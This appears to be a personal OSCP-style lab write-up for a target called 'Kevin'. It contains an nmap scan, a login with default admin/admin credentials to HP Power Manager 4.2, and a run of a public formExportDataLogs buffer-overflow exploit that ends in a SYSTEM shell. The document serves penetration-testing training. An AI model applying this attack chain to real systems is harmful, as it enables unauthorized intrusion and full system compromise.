## Nmap

```json
┌──(ouyang㉿kali)-[~/tools/nmapAutomator]
└─$ ./nmapAutomator.sh -H 192.168.171.45 -t full

Running a full scan on 192.168.171.45

Host is likely running Unknown OS!


---------------------Starting Full Scan------------------------



PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
3573/tcp  open  tag-ups-1
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown



Making a script scan on all ports



PORT      STATE SERVICE            VERSION
80/tcp    open  http               GoAhead WebServer
| http-title: HP Power Manager
|_Requested resource was http://192.168.171.45/index.asp
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2023-08-31T13:14:29+00:00
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2023-08-01T03:26:36
|_Not valid after:  2024-01-31T03:26:36
|_ssl-date: 2023-08-31T13:14:40+00:00; -1s from scanner time.
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-31T06:14:29-07:00
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ba:2b:ea (VMware)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: -1s
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-08-31T13:14:29
|_  start_date: 2023-08-31T13:05:31




---------------------Finished all scans------------------------


Completed in 3 minute(s) and 49 second(s)
```

80 port 的網站用 admin/admin 可成功登入，可看到版本為 4.2

![[截圖 2023-08-31 下午9.45.36.png]]

用 10099.py 失敗，但 google 相關弱點找到 [Github](https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py) 利用成功!

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Kevin]
└─$ python2 exploit.py 192.168.171.45

##//#############################################################################################################
##							##							#
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow	 		#
## 							##  HP Power Manager				 	#
## Vulnerable Application: HP Power Manager	 	##  This is a part of the Metasploit Module, 		#
## Tested on Windows [Version 6.1.7600] 		##  exploit/windows/http/hp_power_manager_filename	#
##							##							#
## Author: Muhammad Haidari				##  Spawns a shell to same window			#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust
##
## Usage: python hpm_exploit.py <Remote IP Address>

[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
(UNKNOWN) [192.168.171.45] 1234 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Get Shell!